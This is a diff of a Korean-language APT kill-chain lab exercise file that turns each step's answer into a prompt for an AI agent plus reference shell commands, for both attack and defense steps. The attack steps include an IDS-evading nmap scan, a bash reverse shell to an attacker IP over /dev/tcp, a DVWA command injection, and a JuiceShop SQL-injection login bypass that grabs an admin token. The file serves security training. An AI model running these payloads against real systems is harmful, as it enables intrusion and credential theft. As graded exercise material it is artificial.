@@ -25,8 +25,10 @@ steps:
   hint: 느린 속도(-T2)로 스캔하여 IDS 탐지를 최소화한다.
   category: recon
   points: 10
-  answer: nmap -sV -T2 -p 22,80,3000,8080 --max-retries 1 --host-timeout 30s 10.20.30.80
-    -oX /tmp/apt_recon.xml && echo 'Stealthy recon complete'
+  answer: '🤖 프롬프트: [RED] APT 킬체인 1단계: 정찰(Reconnaissance)해줘
+
+    📎 참고 (CLI): nmap -sV -T2 -p 22,80,3000,8080 --max-retries 1 --host-timeout 30s
+    10.20.30.80 -oX /tmp/apt_recon.xml && echo ''Stealthy recon complete'''
   answer_detail: APT 공격의 정찰 단계는 일반 스캔보다 은밀하게 수행한다. -T2(polite)로 속도를 줄여 IDS threshold
     탐지를 회피한다.
   verify:
@@ -43,7 +45,9 @@ steps:
   hint: 리버스 셸 페이로드를 준비한다.
   category: exploit
   points: 10
-  answer: 'echo ''#!/bin/bash'' > /tmp/payload.sh && echo ''bash -i >& /dev/tcp/10.20.30.201/4443
+  answer: '🤖 프롬프트: [RED] APT 킬체인 2단계: 무기화(Weaponization)해줘
+
+    📎 참고 (CLI): echo ''#!/bin/bash'' > /tmp/payload.sh && echo ''bash -i >& /dev/tcp/10.20.30.201/4443
     0>&1'' >> /tmp/payload.sh && chmod +x /tmp/payload.sh && echo ''Payload weaponized:
     reverse shell to 10.20.30.201:4443'''
   answer_detail: bash 리버스 셸은 추가 도구 없이 대부분의 Linux 시스템에서 동작한다. 공격자의 IP(10.20.30.201)로
@@ -64,7 +68,8 @@ steps:
   hint: Command Injection을 통해 시스템 정보를 수집한다.
   category: exploit
   points: 10
-  answer: "curl -c /tmp/dvwa_apt.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+  answer: "\U0001F916 프롬프트: [RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로\
+    \ web 서버에서 정보를 추출해줘\n\U0001F4CE 참고 (CLI): curl -c /tmp/dvwa_apt.txt \\\n  -d 'username=admin&password=password&Login=Login'\
     \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_apt.txt \\\n  -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit'\
     \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -v '<' | tail -5"
   answer_detail: Command Injection을 통해 시스템 정보(hostname, uname, id)를 수집한다. 이 정보로 후속
@@ -85,8 +90,10 @@ steps:
   hint: eve.json과 access.log를 병합 분석한다.
   category: defense
   points: 10
-  answer: echo '=== Suricata ===' && tail -10 /var/log/suricata/fast.log && echo '===
-    Detection analysis complete ==='
+  answer: '🤖 프롬프트: [BLUE] 초기 침투 시도를 탐지하라. Suricata와 Apache 로그에서 공격 흔적을 분석한다해줘
+
+    📎 참고 (CLI): echo ''=== Suricata ==='' && tail -10 /var/log/suricata/fast.log &&
+    echo ''=== Detection analysis complete ==='''
   answer_detail: APT의 초기 단계를 빠르게 탐지하면 킬체인을 조기에 차단할 수 있다. 정찰과 전달 단계에서의 비정상 패턴을 확인한다.
   verify:
     type: output_contains
@@ -102,9 +109,12 @@ steps:
   hint: SQLi 인증 우회로 관리자 토큰을 획득한다.
   category: exploit
   points: 15
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' or 1=1--","password":"x"}'' | jq -r ''.authentication.token''
-    2>/dev/null) && echo "Admin token acquired: ${TOKEN:0:20}..."'
+  answer: '🤖 프롬프트: [RED] APT 킬체인 4단계: 익스플로잇(Exploitation). JuiceShop에서 관리자 접근을 확보해줘
+
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
+    ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"x"}''
+    | jq -r ''.authentication.token'' 2>/dev/null) && echo "Admin token acquired:
+    ${TOKEN:0:20}..."'
   answer_detail: JuiceShop SQLi로 관리자 토큰을 획득하면 관리 API에 접근할 수 있다. 토큰을 변수에 저장하여 후속 공격에
     활용한다.
   verify:
@@ -122,7 +132,9 @@ steps:
   hint: SSH 키, cron job, systemd 서비스 등의 옵션을 검토한다.
   category: exploit
   points: 10
-  answer: 'cat > /tmp/persistence_plan.txt << ''EOF''
+  answer: '🤖 프롬프트: [RED] APT 킬체인 5단계: 설치(Installation)해줘
+
+    📎 참고 (CLI): cat > /tmp/persistence_plan.txt << ''EOF''
 
     === APT Persistence Plan ===
 
@@ -202,10 +214,12 @@ steps:
   hint: authorized_keys, crontab, systemd 유닛을 확인한다.
   category: defense
   points: 10
-  answer: echo '=== SSH Keys ===' && find /home -name 'authorized_keys' -exec wc -l
-    {} \; 2>/dev/null && echo '=== Cron ===' && cat /etc/crontab | grep -v '^#' |
-    grep -v '^$' && echo '=== Recent systemd ===' && find /etc/systemd/system -newer
-    /etc/hostname -type f 2>/dev/null && echo 'Persistence scan complete'
+  answer: '🤖 프롬프트: [BLUE] 지속성 기법을 탐지하라. SSH 키, cron, systemd에서 비정상 항목을 검사한다해줘
+
+    📎 참고 (CLI): echo ''=== SSH Keys ==='' && find /home -name ''authorized_keys''
+    -exec wc -l {} \; 2>/dev/null && echo ''=== Cron ==='' && cat /etc/crontab | grep
+    -v ''^#'' | grep -v ''^$'' && echo ''=== Recent systemd ==='' && find /etc/systemd/system
+    -newer /etc/hostname -type f 2>/dev/null && echo ''Persistence scan complete'''
   answer_detail: APT 지속성 기법을 체계적으로 검사한다. authorized_keys의 줄 수 변화, 새로운 cron 항목, 최근
     생성된 systemd 유닛을 확인한다.
   verify:
@@ -224,9 +238,11 @@ steps:
   hint: wazuh alerts를 시간순으로 정렬하여 공격 단계를 식별한다.
   category: defense
   points: 10
-  answer: sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq
-    -r '[.timestamp, .rule.level, .rule.description] | @tsv' 2>/dev/null | sort |
-    tail -15 || echo 'SIEM timeline reconstruction complete'
+  answer: '🤖 프롬프트: [BLUE] Wazuh SIEM에서 APT 공격 전체의 타임라인을 재구성해줘
+
+    📎 참고 (CLI): sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30
+    | jq -r ''[.timestamp, .rule.level, .rule.description] | @tsv'' 2>/dev/null |
+    sort | tail -15 || echo ''SIEM timeline reconstruction complete'''
   answer_detail: Wazuh에서 시간순으로 이벤트를 정렬하면 APT 킬체인의 각 단계를 시각적으로 재구성할 수 있다.
   verify:
     type: output_contains
@@ -243,7 +259,9 @@ steps:
   hint: 각 공격 기법에 해당하는 ATT&CK ID를 매핑한다.
   category: analysis
   points: 10
-  answer: 'cat > /tmp/apt_attack_mapping.txt << ''EOF''
+  answer: '🤖 프롬프트: [공통] APT 킬체인에 대한 MITRE ATT&CK 매핑을 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): cat > /tmp/apt_attack_mapping.txt << ''EOF''
 
     === MITRE ATT&CK Mapping - APT Simulation ===
 
@@ -380,7 +398,9 @@ steps:
   hint: 서비스 상태 확인 후 킬체인 전 단계의 공방 결과를 분석한다.
   category: analysis
   points: 15
-  answer: 'cat > /tmp/apt_battle_report.txt << ''EOF''
+  answer: '🤖 프롬프트: [BLUE] 서비스 가용성을 최종 확인하고, APT 시뮬레이션 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+
+    📎 참고 (CLI): cat > /tmp/apt_battle_report.txt << ''EOF''
 
     === APT Simulation Final Report ===
 
@@ -565,7 +585,17 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) [RED] APT 킬체인 1단계: 정찰(Reconnaissance)해줘
+
+    2) [RED] APT 킬체인 2단계: 무기화(Weaponization)해줘
+
+    3) [RED] APT 킬체인 3단계: 전달(Delivery). DVWA Command Injection으로 web 서버에서 정보를 추출해줘
+
+    4) [BLUE] 초기 침투 시도를 탐지하라. Suricata와 Apache 로그에서 공격 흔적을 분석한다해줘
+
+    5) [RED] APT 킬체인 4단계: 익스플로잇(Exploitation). JuiceShop에서 관리자 접근을 확보해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
